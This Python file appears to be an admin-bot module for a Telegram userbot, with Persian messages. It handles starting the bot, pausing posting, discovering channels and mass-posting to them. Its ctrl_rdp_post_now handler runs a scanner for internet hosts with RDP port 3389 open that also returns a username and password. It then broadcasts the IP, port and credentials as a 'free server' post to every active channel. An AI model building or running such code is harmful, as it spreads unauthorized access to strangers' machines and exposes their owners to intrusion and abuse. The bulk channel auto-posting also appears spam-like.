from aiogram import Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.filters import Command
from app.services.admin_bot.keyboards import control_kb, back_kb
from app.cache.redis_client import cache_set, cache_get
from app.core.logging import get_logger
import asyncio
import random

router = Router()
logger = get_logger(__name__)

_userbot_manager = None


def set_userbot_manager(manager) -> None:
    global _userbot_manager
    _userbot_manager = manager


@router.message(Command("control"))
@router.callback_query(F.data == "control")
async def show_control(event: Message | CallbackQuery):
    msg = event if isinstance(event, Message) else event.message
    posting_paused = await cache_get("system:posting_paused")
    status = "⏸ PAUSED" if posting_paused else "▶️ ACTIVE"

    text = (
        f"⚙️ *System Control*

"
        f"📢 Posting status: *{status}*

"
        "Select an action:"
    )
    await msg.answer(text, parse_mode="Markdown", reply_markup=control_kb())
    if isinstance(event, CallbackQuery):
        await event.answer()


@router.callback_query(F.data == "ctrl_start")
async def ctrl_start(callback: CallbackQuery):
    if not _userbot_manager:
        await callback.message.answer("❌ UserBot manager not available.", reply_markup=back_kb())
        await callback.answer()
        return
    if _userbot_manager.is_running():
        await callback.message.answer("ℹ️ UserBot is already running.", reply_markup=back_kb())
        await callback.answer()
        return
    await _userbot_manager.start()
    await callback.message.answer("✅ UserBot started.", reply_markup=back_kb())
    await callback.answer()


@router.callback_query(F.data == "ctrl_stop")
async def ctrl_stop(callback: CallbackQuery):
    if _userbot_manager:
        await _userbot_manager.stop()
        await callback.message.answer("⏹️ UserBot stopped.", reply_markup=back_kb())
    else:
        await callback.message.answer("❌ UserBot manager not available.", reply_markup=back_kb())
    await callback.answer()


@router.callback_query(F.data == "ctrl_restart")
async def ctrl_restart(callback: CallbackQuery):
    if _userbot_manager:
        await _userbot_manager.stop()
        await _userbot_manager.start()
        await callback.message.answer("🔄 UserBot restarted.", reply_markup=back_kb())
    else:
        await callback.message.answer("❌ UserBot manager not available.", reply_markup=back_kb())
    await callback.answer()


@router.callback_query(F.data == "ctrl_pause_posting")
async def ctrl_pause_posting(callback: CallbackQuery):
    await cache_set("system:posting_paused", True, ttl=86400 * 7)
    await callback.message.answer("⏸️ Posting paused.", reply_markup=back_kb())
    await callback.answer()


@router.callback_query(F.data == "ctrl_resume_posting")
async def ctrl_resume_posting(callback: CallbackQuery):
    from app.cache.redis_client import cache_delete
    await cache_delete("system:posting_paused")
    await callback.message.answer("▶️ Posting resumed.", reply_markup=back_kb())
    await callback.answer()


@router.callback_query(F.data == "ctrl_scan_channels")
async def ctrl_scan_channels(callback: CallbackQuery):
    await callback.message.answer("📡 در حال اسکن کانال‌ها... لطفاً صبر کنید.")
    await callback.answer()

    if not _userbot_manager:
        await callback.message.answer("❌ UserBot در دسترس نیست.", reply_markup=back_kb())
        return

    accounts = _userbot_manager.list_accounts()
    if not accounts:
        await callback.message.answer("❌ هیچ اکانتی متصل نیست.", reply_markup=back_kb())
        return

    total_added = 0
    total_found = 0
    report_lines = []

    from app.services.channel.auto_discover import discover_and_register_channels

    for acc in accounts:
        if not acc["is_connected"]:
            continue
        result = await discover_and_register_channels(_userbot_manager, acc["account_id"])
        total_found += result.get("found", 0)
        total_added += result.get("added", 0)
        for ch in result.get("channels", []):
            name = ch.get("title") or ch.get("username") or "بدون نام"
            report_lines.append(f"  • {name}")

    channels_list = "
".join(report_lines[:20]) if report_lines else "  (هیچ کانالی پیدا نشد)"

    text = (
        f"📡 *نتیجه اسکن کانال‌ها*

"
        f"🔍 پیدا شده: `{total_found}` کانال
"
        f"✅ ثبت جدید: `{total_added}` کانال

"
        f"*کانال‌های یافت‌شده:*
{channels_list}"
    )
    await callback.message.answer(text, parse_mode="Markdown", reply_markup=back_kb())


@router.callback_query(F.data == "ctrl_post_now")
async def ctrl_post_now(callback: CallbackQuery):
    await callback.message.answer("🚀 در حال ارسال پست فوری به همه کانال‌ها...")
    await callback.answer()

    if not _userbot_manager:
        await callback.message.answer("❌ UserBot در دسترس نیست.", reply_markup=back_kb())
        return

    from app.services.channel.auto_poster import _post_to_channel, _get_active_channels, _last_post_time

    channels = await _get_active_channels()
    if not channels:
        await callback.message.answer("❌ هیچ کانال فعالی وجود ندارد.", reply_markup=back_kb())
        return

    success = 0
    failed = 0
    for ch in channels:
        _last_post_time[str(ch.id)] = 0
        ok = await _post_to_channel(_userbot_manager, ch)
        if ok:
            success += 1
        else:
            failed += 1
        await asyncio.sleep(10)

    text = (
        f"✅ پست فوری انجام شد

"
        f"📤 موفق: `{success}` کانال
"
        f"❌ ناموفق: `{failed}` کانال"
    )
    await callback.message.answer(text, parse_mode="Markdown", reply_markup=back_kb())


@router.callback_query(F.data == "ctrl_rdp_post_now")
async def ctrl_rdp_post_now(callback: CallbackQuery):
    """Send a free RDP/server post immediately to all active channels."""
    status_msg = await callback.message.answer(
        "🖥 *در حال اسکن برای سرور رایگان...*

"
        "⏳ اسکنر در حال جستجوی IP با پورت 3389 باز است. چند ثانیه صبر کنید...",
        parse_mode="Markdown",
    )
    await callback.answer()

    if not _userbot_manager:
        await status_msg.edit_text("❌ UserBot در دسترس نیست.", reply_markup=back_kb())
        return

    # ── Step 1: Run RDP scanner ──────────────────────────────────────────────
    try:
        from app.services.scanner.rdp_scanner import scan_for_rdp
        rdp_result = await scan_for_rdp()
    except Exception as e:
        logger.error("admin_rdp_scan_failed", error=str(e))
        await status_msg.edit_text(
            f"❌ *خطا در اسکن:*
`{str(e)[:200]}`

"
            "اسکنر نتوانست IP پیدا کند.",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )
        return

    if not rdp_result:
        await status_msg.edit_text(
            "⚠️ *هیچ سرور بازی پیدا نشد.*

"
            "اسکنر همه کشورها را بررسی کرد ولی پورت 3389 باز پیدا نکرد.
"
            "دوباره امتحان کنید.",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )
        return

    # ── Step 2: Build the post ───────────────────────────────────────────────
    from app.services.content.rdp_post_builder import build_rdp_post
    seed = random.randint(100_000, 99_999_999)
    rdp_content, rdp_image_urls = build_rdp_post(
        ip=rdp_result["ip"],
        port=rdp_result["port"],
        username=rdp_result["username"],
        password=rdp_result["password"],
        country_name=rdp_result["country_name"],
        country_flag=rdp_result["country_flag"],
        seed=seed,
    )

    await status_msg.edit_text(
        f"✅ *سرور پیدا شد!* {rdp_result['country_flag']} {rdp_result['country_name']}

"
        f"🔗 IP: `{rdp_result['ip']}`
"
        f"🔌 Port: `{rdp_result['port']}`
"
        f"👤 User: `{rdp_result['username']}`
"
        f"🔑 Pass: `{rdp_result['password']}`

"
        "📤 *در حال ارسال به همه کانال‌ها...*",
        parse_mode="Markdown",
    )

    # ── Step 3: Send to all active channels ──────────────────────────────────
    from app.db.session import AsyncSessionLocal
    from app.models.channel import TelegramChannel
    from app.models.post import Post
    from app.services.channel.publisher import publish_post
    from sqlalchemy import select
    from datetime import datetime, timezone

    async with AsyncSessionLocal() as session:
        result = await session.execute(
            select(TelegramChannel).where(TelegramChannel.is_active == True)
        )
        channels = result.scalars().all()

        if not channels:
            await status_msg.edit_text(
                "❌ هیچ کانال فعالی وجود ندارد.",
                reply_markup=back_kb(),
            )
            return

        account_id = channels[0].account_id
        channel_ids = [str(ch.id) for ch in channels]

        post = Post(
            account_id=account_id,
            channel_ids=channel_ids,
            content=rdp_content,
            languages={"en": rdp_content},
            image_url=rdp_image_urls,
            status="scheduled",
            scheduled_at=datetime.now(timezone.utc),
        )
        session.add(post)
        await session.flush()

        try:
            await publish_post(session, post)
            await session.commit()
            published_count = len(channels)
            logger.info(
                "admin_rdp_post_sent",
                channels=published_count,
                ip=rdp_result["ip"],
                country=rdp_result["country_name"],
            )
        except Exception as e:
            post.status = "failed"
            await session.commit()
            logger.error("admin_rdp_post_send_failed", error=str(e))
            await status_msg.edit_text(
                f"❌ *خطا در ارسال:*
`{str(e)[:300]}`",
                parse_mode="Markdown",
                reply_markup=back_kb(),
            )
            return

    await status_msg.edit_text(
        f"✅ *پست سرور رایگان ارسال شد!*

"
        f"🌍 کشور: {rdp_result['country_flag']} {rdp_result['country_name']}
"
        f"🔗 IP: `{rdp_result['ip']}`
"
        f"📡 کانال‌ها: `{len(channels)}` کانال
"
        f"🖼 با تصویر: ✅",
        parse_mode="Markdown",
        reply_markup=back_kb(),
    )


@router.message(Command("post_now"))
async def cmd_post_now(message: Message):
    await message.answer("🚀 در حال ارسال پست فوری...")

    if not _userbot_manager:
        await message.answer("❌ UserBot در دسترس نیست.")
        return

    from app.services.channel.auto_poster import _post_to_channel, _get_active_channels, _last_post_time

    channels = await _get_active_channels()
    if not channels:
        await message.answer("❌ هیچ کانال فعالی وجود ندارد.")
        return

    success = 0
    failed = 0
    for ch in channels:
        _last_post_time[str(ch.id)] = 0
        ok = await _post_to_channel(_userbot_manager, ch)
        if ok:
            success += 1
        else:
            failed += 1
        await asyncio.sleep(10)

    await message.answer(
        f"✅ موفق: `{success}` | ❌ ناموفق: `{failed}`",
        parse_mode="Markdown",
        reply_markup=back_kb()
    )


@router.message(Command("scan_channels"))
async def cmd_scan_channels(message: Message):
    await message.answer("📡 در حال اسکن کانال‌ها...")

    if not _userbot_manager:
        await message.answer("❌ UserBot در دسترس نیست.")
        return

    accounts = _userbot_manager.list_accounts()
    if not accounts:
        await message.answer("❌ هیچ اکانتی متصل نیست.")
        return

    from app.services.channel.auto_discover import discover_and_register_channels

    total_added = 0
    total_found = 0
    report_lines = []

    for acc in accounts:
        if not acc["is_connected"]:
            continue
        result = await discover_and_register_channels(_userbot_manager, acc["account_id"])
        total_found += result.get("found", 0)
        total_added += result.get("added", 0)
        for ch in result.get("channels", []):
            name = ch.get("title") or ch.get("username") or "بدون نام"
            report_lines.append(f"  • {name}")

    channels_list = "
".join(report_lines[:20]) if report_lines else "  (هیچ کانالی پیدا نشد)"
    text = (
        f"📡 *نتیجه اسکن*

"
        f"🔍 پیدا شده: `{total_found}`
"
        f"✅ ثبت جدید: `{total_added}`

"
        f"{channels_list}"
    )
    await message.answer(text, parse_mode="Markdown", reply_markup=back_kb())
